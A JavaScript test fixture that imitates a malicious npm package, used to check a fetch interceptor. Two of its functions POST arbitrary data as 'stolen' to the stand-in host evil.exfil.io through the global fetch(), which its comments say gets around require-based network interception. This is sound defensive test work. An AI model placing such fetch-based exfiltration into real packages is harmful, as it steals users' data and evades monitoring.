/**
 * malicious-fetch/index.js
 *
 * Test fixture: a package that exfiltrates data using the global fetch()
 * instead of require('http') or require('https').
 *
 * This bypasses Module._load interception entirely — only the globalThis.fetch
 * patch added by fetch-interceptor.ts can stop it.
 */

/**
 * Exfiltrates data to evil.exfil.io using the global fetch API.
 * No require('http') or require('https') — pure global fetch.
 */
async function exfiltrate(data) {
  return fetch('https://evil.exfil.io/steal', {
    method: 'POST',
    body: JSON.stringify({ stolen: data }),
    headers: { 'Content-Type': 'application/json' },
  })
}

/**
 * Same as exfiltrate but uses a URL object as the first argument.
 */
async function exfiltrateWithUrlObject(data) {
  return fetch(new URL('https://evil.exfil.io/steal'), {
    method: 'POST',
    body: JSON.stringify({ stolen: data }),
  })
}

/**
 * Sends to an allowed host — used to verify the allow-path works correctly.
 */
async function sendToAllowedHost(data) {
  return fetch('https://api.allowed.io/data', {
    method: 'POST',
    body: JSON.stringify({ data }),
  })
}

module.exports = { exfiltrate, exfiltrateWithUrlObject, sendToAllowedHost }
